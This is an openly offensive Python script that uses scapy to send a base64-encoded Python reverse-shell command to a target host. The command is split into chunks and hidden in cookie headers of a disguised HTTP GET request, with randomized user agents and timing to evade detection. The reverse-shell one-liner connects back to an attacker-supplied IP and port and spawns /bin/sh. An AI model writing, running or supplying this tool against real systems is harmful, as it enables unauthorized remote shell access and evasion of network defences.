#!/usr/bin/env python3
from scapy.all import IP, TCP, Raw, send
import random
import base64
import argparse
import logging
from typing import Optional
import time

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class ObfuscatedPayload:
    def __init__(self, target_ip: str, target_port: int = 80):
        """
        Initialize the obfuscated payload generator
        
        Args:
            target_ip (str): Target IP address
            target_port (int): Target port (default: 80)
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
        ]
        
    def generate_reverse_shell(self, attacker_ip: str, attacker_port: int) -> str:
        """
        Generate a reverse shell payload
        
        Args:
            attacker_ip (str): IP address for reverse connection
            attacker_port (int): Port for reverse connection
            
        Returns:
            str: Base64 encoded reverse shell command
        """
        # Python reverse shell payload
        reverse_shell = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        
        # Encode the payload
        return base64.b64encode(reverse_shell.encode()).decode()
        
    def craft_http_get(self, payload: str) -> str:
        """
        Craft a legitimate-looking HTTP GET request with embedded payload
        
        Args:
            payload (str): Payload to embed
            
        Returns:
            str: HTTP GET request with embedded payload
        """
        user_agent = random.choice(self.user_agents)
        
        # Split payload into chunks and embed in cookies
        chunks = [payload[i:i+32] for i in range(0, len(payload), 32)]
        cookies = "; ".join([f"id{i}={chunk}" for i, chunk in enumerate(chunks)])
        
        # Craft legitimate-looking HTTP request
        http_request = (
            f"GET /index.html HTTP/1.1\r\n"
            f"Host: {self.target_ip}\r\n"
            f"User-Agent: {user_agent}\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
            f"Accept-Language: en-US,en;q=0.5\r\n"
            f"Accept-Encoding: gzip, deflate\r\n"
            f"Connection: keep-alive\r\n"
            f"Cookie: {cookies}\r\n"
            f"Upgrade-Insecure-Requests: 1\r\n"
            f"Cache-Control: max-age=0\r\n\r\n"
        )
        
        return http_request
        
    def send_payload(self, payload: str, source_port: Optional[int] = None) -> None:
        """
        Send the obfuscated payload
        
        Args:
            payload (str): Payload to send
            source_port (Optional[int]): Source port to use
        """
        if source_port is None:
            source_port = random.randint(49152, 65535)
            
        # Craft packet
        ip = IP(dst=self.target_ip)
        tcp = TCP(
            sport=source_port,
            dport=self.target_port,
            flags='PA',  # PSH-ACK flags
            seq=random.randint(1000, 9999),
            ack=random.randint(1000, 9999)
        )
        
        # Add the HTTP request as payload
        http_request = self.craft_http_get(payload)
        packet = ip/tcp/Raw(load=http_request)
        
        # Send the packet
        send(packet, verbose=False)
        logging.info(f"Sent obfuscated payload to {self.target_ip}:{self.target_port}")
        
def main():
    parser = argparse.ArgumentParser(
        description='Send obfuscated payload in HTTP request'
    )
    parser.add_argument(
        'target_ip',
        help='Target IP address'
    )
    parser.add_argument(
        'attacker_ip',
        help='Attacker IP address for reverse shell'
    )
    parser.add_argument(
        '-p', '--port',
        type=int,
        default=80,
        help='Target port (default: 80)'
    )
    parser.add_argument(
        '--attacker-port',
        type=int,
        default=4444,
        help='Attacker port for reverse shell (default: 4444)'
    )
    parser.add_argument(
        '--repeat',
        type=int,
        default=1,
        help='Number of times to send payload (default: 1)'
    )
    
    args = parser.parse_args()
    
    # Create payload generator
    obfuscator = ObfuscatedPayload(args.target_ip, args.port)
    
    # Generate reverse shell payload
    payload = obfuscator.generate_reverse_shell(args.attacker_ip, args.attacker_port)
    
    # Send payload specified number of times
    for i in range(args.repeat):
        obfuscator.send_payload(payload)
        if i < args.repeat - 1:
            time.sleep(random.uniform(1, 3))  # Random delay between sends

if __name__ == "__main__":
    main()